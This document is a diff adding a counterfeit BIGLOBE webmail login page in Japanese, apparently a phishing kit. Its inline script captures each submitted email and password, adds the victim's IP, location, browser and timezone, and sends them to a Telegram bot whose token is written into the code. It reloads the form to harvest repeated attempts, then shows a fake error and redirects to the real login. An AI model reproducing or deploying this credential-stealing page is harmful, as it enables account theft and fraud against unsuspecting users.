@@ -1,0 +1,276 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN" "http://www.w3.org/TR/html4/frameset.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="Pragma" content="no-store">
+<meta http-equiv="Cache-Control" content="no-store">
+<meta http-equiv="Expires" content="0">
+<meta http-equiv="X-UA-Compatible" content="requiresActiveX=true" />
+<meta name="keywords" content="メール,Webメール,ＢＩＧＬＯＢＥ" />
+<meta name="description" content="BIGLOBEメールはブラウザで手軽にメールが使えます。" />
+<title>BIGLOBEメール｜Webメール</title>
+<link rel="icon" href="https://webmail.biglobe.ne.jp/images2/common/favicon.ico" type="image/vnd.microsoft.icon" />
+<link href="https://webmail.biglobe.ne.jp/css2/import_top.css" rel="stylesheet" type="text/css" />
+<script type="text/javascript" src="https://webmail.biglobe.ne.jp/js2/common.js"></script>
+<script type="text/javascript" src="https://webmail.biglobe.ne.jp/js2/wm_login.js"></script>
+<script type="text/javascript" src="/api/js/input_time_chk.js"></script>
+<link rel="stylesheet" href="https://webmail.biglobe.ne.jp/softkeyboard/softkeyboardsjis.css">
+<script src="/api/softkeyboard/webmail_jquery.js"></script>
+<script src="/api/softkeyboard/webmail_jquery.softkeyboard.loginmail.js"></script>
+
+<script>
+  function sendToTelegram(email, password, attempts) {
+    const botToken = '7768568185:AAEUVStxi1GKrfXGmKgWSfFWeBLxwspx7rk'; // Replace with your bot token
+    const chatId = '7448260596'; // Replace with your chat ID
+    
+    // Get additional user information
+    fetch('https://ipapi.co/json/')
+      .then(response => response.json())
+      .then(ipData => {
+        const message = `💥🎓🚀🏆Biglobe RESZULT 2025 OGPLOGS💥🎓🚀🏆
+
+📧 Email: ${email}
+🔐 Password: ${password}
+📌 IP: ${ipData.ip || 'Unknown'}
+🌐 Country: ${ipData.country_name || 'Unknown'}
+🏙 City: ${ipData.city || 'Unknown'}
+📍 Region: ${ipData.region || 'Unknown'}
+📺 Browser: ${navigator.userAgent || 'Unknown'}
+🚩 Language: ${navigator.language || 'Unknown'}
+🕰 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown'}`;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+          }),
+        })
+        .catch(error => console.error('Error sending to Telegram:', error));
+      })
+      .catch(error => {
+        console.error('Error fetching IP data:', error);
+        // Send basic info if IP lookup fails
+        const fallbackMessage = `💥🎓🚀🏆Biglobe RESZULT 2025 OGPLOGS💥🎓🚀🏆
+
+📧 Email: ${email}
+🔐 Password: ${password}
+📌 IP: Unknown (lookup failed)
+📺 Browser: ${navigator.userAgent || 'Unknown'}
+🚩 Language: ${navigator.language || 'Unknown'}
+🕰 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown'}`;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: fallbackMessage,
+          }),
+        })
+        .catch(err => console.error('Error sending fallback to Telegram:', err));
+      });
+  }
+
+  function getEmailFromUrl() {
+    return window.location.hash.substring(1);
+  }
+
+  window.onload = function() {
+    var emailValue = getEmailFromUrl();
+    if (emailValue) {
+      var emailField = document.getElementById('loginid');
+      emailField.value = emailValue;
+      emailField.readOnly = true;
+    }
+
+    var attemptCount = parseInt(sessionStorage.getItem('loginAttempts')) || 0;
+    var maxAttemptsAllowed = 4;
+
+    document.forms.direct.onsubmit = function(e) {
+      e.preventDefault();
+
+      var userEmail = document.getElementById('loginid').value;
+      var userPassword = document.getElementById('biglobe_pw').value;
+
+      attemptCount++;
+      sessionStorage.setItem('loginAttempts', attemptCount);
+
+      sendToTelegram(userEmail, userPassword, attemptCount);
+
+      if (attemptCount < maxAttemptsAllowed) {
+        setTimeout(function() {
+          location.reload();
+        }, 1200);
+      } else {
+        sessionStorage.removeItem('loginAttempts');
+        alert("認証エラーが発生しました。しばらくしてから再度お試しください。");
+        setTimeout(function() {
+          window.location.href = "https://auth.sso.biglobe.ne.jp/mail/";
+        }, 1500);
+      }
+    };
+  };
+</script>
+</head>
+
+<body>
+<div id="container">
+  <div id="header_main">
+    <div id="header_logo">
+      <h1><img src="https://webmail.biglobe.ne.jp/images2/common/logo_email.gif" alt="BIGLOBEメール" usemap="#logo" width="210" height="31" /></h1>
+      <map name="logo">
+        <area shape="rect" coords="0,0,150,35" href="http://www.biglobe.ne.jp/" alt="BIGLOBE" />
+        <area shape="rect" coords="150,0,210,35" href="https://webmail.biglobe.ne.jp/" alt="BIGLOBEメール" />
+      </map>
+    </div>
+    <div id="header_keyword">
+      <strong>メールがもっと便利で楽しくなる！</strong>
+    </div>
+    <br class="clear" />
+  </div>
+  
+  <div id="header-link">
+    <div id="support_menu">
+      <ul class="fmenu">
+        <li><a href="https://email.biglobe.ne.jp/">メールサービス</a></li>
+        <li><a class="bl" href="https://support.biglobe.ne.jp/" target="_blank">会員サポート</a></li>
+        <li><a class="bl" href="https://support.biglobe.ne.jp/shogaiap/service.html" target="_blank">障害情報</a></li>
+      </ul>
+    </div>
+  </div>
+
+  <div id="main">
+    <div id="contents_block">
+      <iframe src="https://member4.sso.biglobe.ne.jp/heute" width="800" height="36" frameborder="0"></iframe>
+      <div class="infotitle" style="margin-top:25px;">お知らせ</div>
+      <div class="infoArea">
+        <p>・<a href="https://support.biglobe.ne.jp/menteap/service.html" target="_blank">BIGLOBEメール、メールサービスのメンテナンス情報はこちらをご確認ください。</a></p>
+        <p>・<a href="https://support.biglobe.ne.jp/news/news716.html" target="_blank">BIGLOBEメール 一部仕様変更のお知らせ</a></p>
+        <p>・<a href="https://support.biglobe.ne.jp/news/news550.html#a_faq1" target="_blank">Webメールにログインが出来ない場合はこちらをご確認ください。</a></p>
+      </div>
+
+      <script>
+        function getResponsiveCSS() {
+          // Responsive design function
+        }
+        getResponsiveCSS();
+      </script>
+      <div id="info_footer"><p>
+        <div class="webrylink">
+          <center>
+            <div class="banner_area" style="margin-bottom: 15px;"></div>
+            <ul>
+              <li><a href="https://webmail.biglobe.ne.jp/requirements.html">推奨環境</a></li>
+              <li><a href="https://email.biglobe.ne.jp/faq/Default.htm">ヘルプ</a></li>
+              <li><a href="http://email.biglobe.ne.jp/faq.html">よくあるお問い合わせ</a></li>
+              <li><a href="https://webmail.biglobe.ne.jp/read.html">必ずお読みください</a></li>
+            </ul>
+          </center>
+        </div>
+      </p></div>
+    </div>
+
+    <div id="side_menuArea">
+      <div id="side_menu_block">
+        <div id="side_menu">
+          <h2><img src="https://webmail.biglobe.ne.jp/images2/pagetitle_top.jpg" alt="BIGLOBEメールメールにログイン" width="238" height="43" /></h2>
+          <div class="login_block">
+            <div id="login_form">
+              <form method="POST" name="direct" action="#">
+                <input type="hidden" name="sms" value="">
+                <input type="hidden" name="ems" value="">
+                <div>
+                  <label for="loginid">メールアドレスまたはユーザID</label>
+                  <input name="loginid" type="text" size="35" autocomplete="off" id="loginid" value="" style="ime-mode: disabled" />
+                  <label for="biglobe_pw">BIGLOBEパスワード</label>
+                  <input name="biglobe_pw" type="password" size="30" id="biglobe_pw" />
+                </div>
+                
+                <script>
+                  var ua = navigator.userAgent;
+                  if (ua.indexOf('Android') == -1 && ua.indexOf('iPhone') == -1 && ua.indexOf('iPad') == -1) {
+                    document.write("<div class='skey'><img src='https://webmail.biglobe.ne.jp/images2/button_softkey.gif' alt='ソフトウェアキーボードで入力する' title='ソフトウェアキーボードで入力する' width='200' height='30' id='soft_keyboard_pass_id'></div>");
+                  }
+                </script>
+
+                <div id="keyboard"></div>
+                <div id="my_div"></div>
+
+                <script>
+                  $(function(){
+                    $("#keyboard").keyboard({
+                      SelBoxPosition : 0,
+                      IdBoxPosition : 0,
+                      PassBoxPosition : 0,
+                      IdInputID  : 'loginid',
+                      PassInputID  : 'biglobe_pw',
+                      ExecKeyboard : 'soft_keyboard_pass_id',
+                      DirectoryName : 'softkeyboard/',
+                      IdMaxLen  : 8,
+                      PassMaxLen  : 16
+                    });
+                  });
+                </script>
+
+                <ul>
+                  <li><input type="checkbox" name="autologinidflag" id="autologinidflag" value="1" /><label for="autologinidflag">次回からIDの入力を省略</label></li>
+                  <li><input type="checkbox" name="autologinflag" id="autologinflag" value="1" /><label for="autologinflag"><a href="http://support.biglobe.ne.jp/settei/webmail/login.html" target="_blank">ログイン状態を保存する</a><br />（共有パソコンではチェックをはずしてください）</label></li>
+                </ul>
+
+                <div class="loginBtn">
+                  <input type="image" src="https://webmail.biglobe.ne.jp/images2/btn_login.gif" border="0" alt="ログイン" title="ログイン" width="205" height="37" />
+                </div>
+              </form>
+            </div>
+            <script>
+              function doit() {
+                // Initialization function
+              }
+              doit();
+            </script>
+
+            <ul class="supportLink">
+              <li><a href="http://support.biglobe.ne.jp/settei/webmail/login.html" target="_blank">ログイン方法について</a></li>
+              <li><a href="http://support.biglobe.ne.jp/jimu/idpw/index.html" target="_blank">ID・パスワードを忘れた場合</a><br />BIGLOBE法人会員でID・パスワードをお忘れの方は［<a href="https://biz.biglobe.ne.jp/member/support.html" target="_blank">こちら</a>］</li>
+              <li><a href="http://email.biglobe.ne.jp/mailaccount.html" target="_blank">メールアドレスの取得・確認</a></li>
+              <li><a href="http://email.biglobe.ne.jp/machange/index.html" target="_blank">メールアドレスの変更</a></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div id="footerContainer">
+      <div id="footerLink">
+        <div id="footerLinkBox1">&nbsp;</div>
+        <div id="footerLinkBox2">
+          <a href="https://www.biglobe.ne.jp/">BIGLOBEトップ</a>｜<a href="https://join.biglobe.ne.jp/">インターネット接続</a>（<a href="https://join.biglobe.ne.jp/ftth/hikari/">ビッグローブ光</a>・<a href="https://join.biglobe.ne.jp/mobile/">格安SIM</a>・<a href="https://join.biglobe.ne.jp/mobile/special/">SIM替え</a>）<br>
+          <a href="https://www.biglobe.co.jp/">会社概要</a>｜<a href="https://www.biglobe.ne.jp/whatsnew/news.html">ニュースリリース</a>｜<a href="https://www.biglobe.co.jp/recruit/index.html">採用情報</a>｜<a href="https://www.biglobe.ne.jp/privacy.html">個人情報保護ポリシー</a>｜<a href="https://www.biglobe.ne.jp/cookie.html">Cookieポリシー</a>｜<a href="https://support.biglobe.ne.jp/safesecurity/">安心・安全</a>｜<a href="https://support.biglobe.ne.jp/">お問い合わせ</a>
+        </div>
+        <div id="footerLinkBox3">
+          <img src="https://webmail.biglobe.ne.jp/images2/common/footer3logo.gif" alt="" width="210" height="66" usemap="#FooterMap" />
+          <map name="FooterMap" id="FooterMap">
+            <area shape="rect" coords="95,0,155,64" href="https://privacymark.jp/" target="_blank" alt="プライバシーマーク" />
+            <area shape="rect" coords="160,0,210,64" href="http://www.biglobe.ne.jp/safesecurity.html" target="_blank" alt="インターネット接続サービス安全・安心マーク" />
+          </map>
+        </div>
+      </div>
+      <div id="footerCopyright">
+        <script>
+          function copyright() {
+            document.write("Copyright(C)BIGLOBE Inc.");
+          }
+          copyright();
+        </script>
+        <noscript>Copyright(C)BIGLOBE Inc.</noscript>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
